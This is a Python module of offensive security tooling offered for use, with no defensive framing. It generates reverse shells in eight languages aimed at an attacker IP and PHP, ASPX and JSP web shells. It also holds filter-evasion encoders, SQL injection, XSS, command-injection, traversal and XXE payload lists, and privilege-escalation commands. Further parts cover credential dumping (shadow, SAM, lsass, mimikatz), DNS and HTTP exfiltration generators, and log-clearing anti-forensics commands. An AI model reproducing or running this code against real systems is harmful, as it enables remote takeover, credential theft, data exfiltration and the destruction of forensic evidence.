"""
Advanced Security Tools - Reverse Shell, Payload Generation, Exploitation
"""

import socket
import subprocess
import os
import base64
import urllib.parse
import hashlib
from typing import List, Dict, Any


class ReverseShellGenerator:
    """Generate reverse shell payloads for various platforms"""
    
    @staticmethod
    def bash_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Bash reverse shell one-liner"""
        return f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    
    @staticmethod
    def python_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Python reverse shell"""
        payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
        return payload
    
    @staticmethod
    def nc_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Netcat reverse shell"""
        return f"nc -e /bin/sh {attacker_ip} {attacker_port}"
    
    @staticmethod
    def powershell_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """PowerShell reverse shell for Windows"""
        # Use string concatenation to avoid brace collisions in PowerShell blocks
        payload = ("$client = New-Object System.Net.Sockets.TCPClient(\"" + attacker_ip + "\"," + str(attacker_port) + ");"
                   "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
                   "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                   "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                   "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close()")
        return payload
    
    @staticmethod
    def perl_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Perl reverse shell"""
        # avoid f-string braces inside perl code by concatenating
        payload = ("perl -e 'use Socket;$i=\"" + attacker_ip + "\";$p=" + str(attacker_port) + ";"
               "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
               "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
        return payload
    
    @staticmethod
    def php_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """PHP reverse shell"""
        payload = f"""php -r '$sock=fsockopen("{attacker_ip}",{attacker_port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
        return payload
    
    @staticmethod
    def ruby_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Ruby reverse shell"""
        # avoid f-strings due to Ruby block braces
        payload = ("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + attacker_ip + "\"," + str(attacker_port) + ");"
               "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'")
        return payload
    
    @staticmethod
    def jsp_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """JSP reverse shell"""
        # simplified JSP payload; avoid double-brace collisions
        payload = ("<%@ page import=\"java.io.*\" %><%@ page import=\"java.net.*\" %>"
               "<%try{ Runtime.getRuntime().exec(\"/bin/bash -c 'bash -i >& /dev/tcp/" + attacker_ip + "/" + str(attacker_port) + " 0>&1'\"); }catch(Exception e){} %>")
        return payload


class WebShellGenerator:
    """Generate web shells for file upload exploitation"""
    
    @staticmethod
    def php_simple_shell() -> str:
        """Simple PHP shell"""
        return """<?php system($_GET['cmd']); ?>"""
    
    @staticmethod
    def php_advanced_shell() -> str:
        """Advanced PHP shell with features"""
        return """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>"""
    
    @staticmethod
    def aspx_shell() -> str:
        """ASP.NET shell"""
        return """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% 
Process proc = new Process();
proc.StartInfo.FileName = Request["cmd"];
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.RedirectStandardOutput = true;
proc.Start();
Response.Write(proc.StandardOutput.ReadToEnd());
%>"""
    
    @staticmethod
    def jsp_shell() -> str:
        """JSP shell"""
        return """<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {
    out.println(line + "<br>");
}
%>"""


class PayloadEncoder:
    """Encode payloads to bypass security filters"""
    
    @staticmethod
    def url_encode(payload: str) -> str:
        """URL encode payload"""
        return urllib.parse.quote(payload)
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode payload"""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode payload"""
        return payload.encode().hex()
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def html_encode(payload: str) -> str:
        """HTML entity encode"""
        html_entities = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '&': '&amp;',
        }
        return ''.join(html_entities.get(c, c) for c in payload)
    
    @staticmethod
    def mixed_case(payload: str) -> str:
        """Mixed case encoding"""
        return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))


class ExploitPayloads:
    """Collection of common exploitation payloads"""
    
    # SQL Injection payloads
    SQL_UNION_INJECTION = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT version(),user(),database(),4--",
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')></marquee>",
        "<details open ontoggle=alert('XSS')>",
    ]
    
    # Command Injection payloads
    CMD_INJECTION = [
        "; ls -la",
        "| id",
        "& whoami",
        "`id`",
        "$(whoami)",
        "&& cat /etc/passwd",
        "|| cat /etc/shadow",
    ]
    
    # Path Traversal payloads
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..;/etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
    ]
    
    # XXE payloads
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
    ]
    
    # LDAP Injection
    LDAP_INJECTION = [
        "*",
        "*)(|(cn=*",
        "admin*",
    ]
    
    @classmethod
    def get_payloads_by_type(cls, payload_type: str) -> List[str]:
        """Get payloads by type"""
        payloads_map = {
            'sql': cls.SQL_UNION_INJECTION,
            'xss': cls.XSS_PAYLOADS,
            'cmd': cls.CMD_INJECTION,
            'traversal': cls.PATH_TRAVERSAL,
            'xxe': cls.XXE_PAYLOADS,
            'ldap': cls.LDAP_INJECTION,
        }
        return payloads_map.get(payload_type, [])


class PrivilegeEscalation:
    """Privilege escalation payloads and techniques"""
    
    # Linux escalation
    LINUX_ESCALATION = {
        'sudo': [
            'sudo -l',
            'sudo -u#-1 /bin/bash',
            'sudo env /bin/bash',
        ],
        'suid': [
            'find / -perm -4000 -ls 2>/dev/null',
            'find / -perm -2000 -ls 2>/dev/null',
        ],
        'capabilities': [
            'getcap -r / 2>/dev/null',
            'setcap cap_setuid+ep /bin/bash',
        ],
    }
    
    # Windows escalation
    WINDOWS_ESCALATION = {
        'uac_bypass': [
            'powershell Start-Process cmd.exe -Verb runAs',
            'runas /user:Administrator cmd.exe',
        ],
        'privilege_check': [
            'whoami /priv',
            'net user Administrator',
        ],
    }
    
    @classmethod
    def get_escalation_payloads(cls, os_type: str, method: str) -> List[str]:
        """Get escalation payloads by OS and method"""
        if os_type.lower() == 'linux':
            return cls.LINUX_ESCALATION.get(method, [])
        elif os_type.lower() == 'windows':
            return cls.WINDOWS_ESCALATION.get(method, [])
        return []


class CredentialTheft:
    """Techniques for credential extraction"""
    
    # Credential dumping techniques
    CREDENTIAL_DUMP = {
        'linux': {
            'shadow': 'cat /etc/shadow',
            'password': 'cat /etc/passwd',
            'ssh_keys': 'find / -name "id_rsa" 2>/dev/null',
            'bash_history': 'cat ~/.bash_history',
        },
        'windows': {
            'sam': 'reg save HKLM\\SAM sam.reg',
            'lsass': 'procdump -accepteula -ma lsass.exe lsass.dmp',
            'mimikatz': 'mimikatz.exe "lsadump::sam" exit',
        },
    }
    
    # Common credential locations
    CREDENTIAL_PATHS = [
        '~/.ssh/id_rsa',
        '~/.ssh/authorized_keys',
        '~/.bash_history',
        '~/.mysql_history',
        '~/.python_history',
        '~/.aws/credentials',
        '~/.git-credentials',
        '/var/www/html/config.php',
        '/etc/mysql/my.cnf',
        'C:\\Users\\*/AppData/Local/Google/Chrome/User Data/Local State',
    ]


class NetworkExploit:
    """Network-based exploitation techniques"""
    
    @staticmethod
    def generate_dns_exfiltration(data: str, domain: str) -> List[str]:
        """Generate DNS queries for data exfiltration"""
        # Encode data in base32 for DNS compatibility
        import base64
        encoded = base64.b32encode(data.encode()).decode().lower()
        
        # Split into DNS label-sized chunks (63 chars max per label)
        queries = []
        for i in range(0, len(encoded), 63):
            chunk = encoded[i:i+63]
            query = f"{chunk}.{domain}"
            queries.append(query)
        
        return queries
    
    @staticmethod
    def generate_http_exfiltration(data: str, server_url: str) -> List[str]:
        """Generate HTTP requests for data exfiltration"""
        # Split data into reasonable HTTP request sizes
        requests = []
        chunk_size = 1000
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            encoded = urllib.parse.quote(base64.b64encode(chunk.encode()).decode())
            request = f"GET /{encoded} HTTP/1.1\\r\\nHost: {server_url}\\r\\n\\r\\n"
            requests.append(request)
        
        return requests


class AntiForensics:
    """Techniques to cover tracks and evade detection"""
    
    # Log clearing techniques
    LOG_CLEARING = {
        'linux': [
            'cat /dev/null > /var/log/auth.log',
            'cat /dev/null > /var/log/syslog',
            'history -c',
            'rm -rf ~/.bash_history',
            'unset HISTFILE',
        ],
        'windows': [
            'wevtutil cl System',
            'wevtutil cl Security',
            'wevtutil cl Application',
            'Clear-EventLog -LogName System',
        ],
    }
    
    # Timestamp manipulation
    TIMESTAMP_MANIPULATION = {
        'linux': 'touch -d "2020-01-01" /path/to/file',
        'windows': 'powershell (Get-Item "C:\\file").LastWriteTime = "01/01/2020 00:00:00"',
    }


class SecurityBypass:
    """Techniques to bypass security controls"""
    
    # WAF bypass techniques
    WAF_BYPASS = {
        'encoding': [
            'URL encode',
            'Double URL encode',
            'HTML encode',
            'Hex encode',
            'Unicode encode',
        ],
        'case_variation': [
            'sElEcT',
            'SeLeCt',
            'SELECT',
        ],
        'comment_injection': [
            'S/**/ELECT',
            'SEL/**/ECT',
            'SE--LECT',
        ],
        'whitespace': [
            'SELECT%09*',
            'SELECT%0A*',
            'SELECT%0B*',
        ],
    }
    
    # IDS/IPS evasion
    IDS_EVASION = {
        'fragmentation': 'Fragment packets across multiple TCP segments',
        'ssl_split': 'Split SSL/TLS handshake across packets',
        'polymorphic': 'Use polymorphic shellcode',
        'encryption': 'Encrypt payload with random algorithm',
    }
